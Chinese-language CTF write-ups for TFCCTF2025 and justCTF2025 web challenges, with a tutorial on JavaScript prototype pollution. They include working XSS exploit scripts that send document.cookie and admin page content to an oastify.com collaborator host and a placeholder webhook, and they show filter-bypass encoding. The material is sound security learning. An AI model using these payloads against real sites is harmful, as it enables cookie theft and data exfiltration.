<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sum to remove `l` char in base64</span></span><br><span class="line">js_inner = <span class="string">&quot;  fetch(&#x27;https://m5s9ag1y50zj7a69toy64m&#x27; + &#x27;7l7cd31zxnm.oastify.com/?x=&#x27;+document.cookie) &quot;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;<span class="subst">&#123;js&#125;</span>&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">        to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># (Blocked chars check)</span></span><br><span class="line"><span class="comment"># Not exploit</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;import&quot;</span>,</span><br><span class="line">          <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;JAVASCRIPT&quot;</span>, <span class="string">&quot;window&quot;</span>, <span class="string">&quot;atob&quot;</span>, <span class="string">&quot;btoa&quot;</span>, <span class="string">&quot;=&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEBLESS"><a href="#WEBLESS" class="headerlink" title="WEBLESS"></a>WEBLESS</h3><p><strong>一、题目描述</strong></p>
<p>用户注册登录后，可以创建 Post ，创建好之后可以浏览，也可以通过点击 Report to Admin 触发机器人访问该Post</p>
<style>.hohhypbxdhki{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250902204726339.png" class="hohhypbxdhki" alt="image-20250902204726339">

<p>flag被管理员写在了Post中，只有管理员或者机器人可通过 <code>/post/0</code> 访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ADMIN_USERNAME = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_PASSWORD = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;ADMIN_USERNAME: ADMIN_PASSWORD&#125;</span><br><span class="line">posts = [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: ADMIN_USERNAME,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: FLAG,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>

<p>目标是让机器人访问存放flag的页面： <code>post/0</code> ，然后再想办法获取flag</p>
<p><strong>二、题目分析</strong></p>
<p>用户登录之后，可以创建Post</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create_post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    description = request.form[<span class="string">&quot;description&quot;</span>]   <span class="comment"># 获取用户输入的 description</span></span><br><span class="line">    hidden = request.form.get(<span class="string">&quot;hidden&quot;</span>) == <span class="string">&quot;on&quot;</span>  <span class="comment"># Checkbox in form for hidden posts</span></span><br><span class="line">    post_id = <span class="built_in">len</span>(posts)</span><br><span class="line">    posts.append(&#123;   // 将用户的该post条目加入posts</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: post_id,</span><br><span class="line">        <span class="string">&quot;author&quot;</span>: session[<span class="string">&quot;username&quot;</span>],   <span class="comment"># author是session[username]</span></span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: hidden</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>用户可以访问自己创建的笔记</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="comment"># 判断访问的id是否存在</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="comment"># 判断用户是否设置可见 且 判断用户是否为作者</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="comment"># 若id存在 且 用户为作者，将post（包含用户输入title和description）传入render_template函数</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>用户访问 <code>/report</code> 页面时会触发机器人访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)   <span class="comment"># 获取data部分的url</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Missing url&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="comment"># 创建线程执行 run_admin_bot 函数</span></span><br><span class="line">    Thread(target=_run_admin_bot, args=(url,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Report queued&#x27;</span>, <span class="number">202</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_admin_bot</span>(<span class="params">target_url: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将 url 作为参数传递给bot</span></span><br><span class="line">        bot.run_report(target_url, ADMIN_USERNAME, ADMIN_PASSWORD)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[BOT] Done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bot <code>report</code>操作实际是以管理员身份登录和访问待 <code>report</code> 的 <code>url</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_report</span>(<span class="params">url, username, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        <span class="comment"># 1.以管理员身份登录</span></span><br><span class="line">        driver.get(<span class="string">f&quot;http://127.0.0.1:5000/login?username=<span class="subst">&#123;username&#125;</span>&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Wait until page is loaded (document.readyState == &quot;complete&quot;)</span></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.访问 report page url</span></span><br><span class="line">        driver.get(url)</span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return window.reportReady === true&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Report page fully loaded&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结合 <code>flag</code> 存放在管理员的 <code>post/0</code> 中，突破点在触发机器人执行report，以管理员的身份登录之后去访问某个<code>url</code>，若该<code>url</code>包含恶意链接，使得机器人在访问时将其<code>cookie</code>或者之前访问 <code>post/0</code> 的内容带出来，即可获得<code>flag</code></p>
<p><code>exp</code>如下：</p>
<p>注：<code>credentialless</code> 的核心作用是：让 iframe 请求不带 cookie，适用于跨域信息泄露场景</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">URL = <span class="string">&quot;https://webless-156e7e4ba10d8dc9.challs.tfcctf.com&quot;</span></span><br><span class="line"></span><br><span class="line">solution = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;/post/0&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe credentialless src=&quot;/login?username=&lt;script&gt;fetch(`https://WEBHOOOK/$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;`)&lt;/script&gt;&amp;password=a&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s.post(URL+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/create_post&quot;</span>, data=&#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;LEAK&quot;</span>, <span class="string">&quot;description&quot;</span>: solution, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;off&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/post/1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Check the webhook&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>poyload</code>的解释如下：</p>
<p>用户创建的post中包含solution，</p>
<p>当bot通过<code>&quot;http://127.0.0.1:5000/post/1&quot;</code> 访问时，返回的页面中包含solution；bot首先会访问 <code>src=“post/0”</code> ，然后会访问 <code>src=&quot;/login?username=&lt;script&gt;fetch(......)$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;</code></p>
<p>在访问后者时会获取前一帧显示的内容的前20个字符，将通过base64编码后发送到<code>https://WEBHOOOK</code>，即将flag的值发送出来了</p>
<p><img src="/image-20250902224454450.png" alt="image-20250902224454450"></p>
<h3 id="WEB-DOM"><a href="#WEB-DOM" class="headerlink" title="WEB-DOM"></a>WEB-DOM</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md">https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>server响应配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;: &quot;invalid-value&quot;, &quot;observedAttribute&quot;: &quot;aria-label&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/image-20250910160934444.png" alt="image-20250910160934444"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/02/TFCCTF2025/" data-id="cuidX075fnWBRvwCLE5XdvuNu" data-title="TFCCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-justCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/08/10/justCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-08-10T10:20:25.000Z" itemprop="datePublished">2025-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/08/10/justCTF2025/">justCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="justCTF-2025"><a href="#justCTF-2025" class="headerlink" title="justCTF 2025"></a>justCTF 2025</h2><h3 id="positive-player"><a href="#positive-player" class="headerlink" title="positive_player"></a>positive_player</h3><h4 id="前置知识–JS原型链污染"><a href="#前置知识–JS原型链污染" class="headerlink" title="前置知识–JS原型链污染"></a>前置知识–JS原型链污染</h4><h5 id="原型链概念"><a href="#原型链概念" class="headerlink" title="原型链概念"></a>原型链概念</h5><p>JavaScript 的每个对象拥有一个原型对象，以该原型为模板、继承方法和属性；原型对象也可能拥有原型，并从中继承方法和属性，以此类推。这种关系常被称为<strong>原型链</strong> (prototype chain)。</p>
<p>任何对象的祖先原型都是 <code>object.prototype</code>。</p>
<h6 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h6><p><strong>一、<em>proto</em>_ 属性</strong></p>
<p>每个对象实例都有的一个内部属性，指向该对象的“原型对象”，即该对象从哪里继承属性和方法</p>
<p>可通过 <code>__proto__</code> 访问其原型对象</p>
<p><strong>二、prototype 属性</strong></p>
<p>函数（包括构造函数）的一个属性</p>
<p>本质上是一个模板对象，新实例会继承它上面的属性和方法</p>
<p><strong>三、constructor 属性</strong></p>
<p>默认存在于函数的 <code>prototype</code> 对象上。</p>
<p>指向创建该 <code>prototype</code> 对象的构造函数本身。如 <code>A.prototype.constructor</code> 默认指向 <code>A</code>。</p>
<h6 id="重要关系"><a href="#重要关系" class="headerlink" title="重要关系"></a>重要关系</h6><p>任意对象可通过属性 <code>__proto__</code> 访问其原型对象，即 <code>obj.__proto__ == Object.prototype</code></p>
<p>实例对象可以通过原型链访问到 <code>constructor</code> 属性，即：<code>obj.constructor.prototype</code> &#x3D;&#x3D;&#x3D; <code>Object.prototype</code>。比如：</p>
<h5 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>JavaScript类的所有属性都允许被公开的访问和修改，包括属性 <code>__proto__</code> ，<code>constructor</code>和<code>prototype</code>。</p>
<p>原型污染指的是攻击者能够修改应用程序或库使用的对象原型（通常是 <code>Object.prototype</code>）的属性，且被所有经过该原型链的对象所继承，从而导致不可预期的行为，如拒绝服务攻击（通过触发JavaScript异常）或者远程代码执行等。</p>
<p>原型链污染目的是在<code>Object.prototype</code>上造成污染，主要有两种场景：</p>
<p>​	不安全的对象递归合并</p>
<p>​	按路径定义属性</p>
<h6 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h6><p>递归合并函数<code>merge()</code>的基本逻辑和代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 符合模式一：obj[a][b] = value</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若 <code>source</code> 包含<strong>可枚举</strong>属性 <code>__proto__</code>， 则可以新增&#x2F;修改 <code>tagret[__proto__]</code> 属性</p>
<p>以下代码存在原型链污染漏洞：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(obj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">// 此时 obj.__proto__.isAdmin = true</span></span><br><span class="line"><span class="comment">// 而 obj.__proto__ 就是 Object.prototype（因为 obj 是 &#123;&#125;）</span></span><br><span class="line"><span class="comment">// 所以 Object.prototype.isAdmin = true</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>user</code> 是新对象，也“自动”获得了 <code>isAdmin: true</code>。</p>
<h6 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h6><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。如以下的函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将对象object的指定路径path的属性值修改为value</span></span><br><span class="line"><span class="title function_">theFunction</span>(object, path, value)</span><br></pre></td></tr></table></figure>

<p>如果攻击者可以控制路径<code>path</code>的值，那么将路径设置为<code>_proto_.value</code>，运行theFunction函数后就有可能将<code>value</code>属性注入到object的原型中</p>
<p>如joint.js中的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setByPath = <span class="keyword">function</span>(<span class="params">obj, path, value, delimiter</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(path) ? path : path.<span class="title function_">split</span>(delimiter || <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> last = keys.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> diver = obj;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; last; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> key = keys[i];</span><br><span class="line">        <span class="keyword">const</span> value = diver[key];</span><br><span class="line">        <span class="comment">// diver creates an empty object if there is no nested object under such a key.</span></span><br><span class="line">        <span class="comment">// This means that one can populate an empty nested object with setByPath().</span></span><br><span class="line">        diver = value || (diver[key] = &#123;&#125;); <span class="comment">//自动创建中间层级：如果路径中的某层不存在，自动创建为&#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    diver[keys[last]] = value;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>setByPath</code>函数在对象 <code>obj</code> 中，将 <code>path</code> 路径对应的属性设置为 <code>value</code></p>
<p>输入以下的路径，那就会造成原型污染：</p>
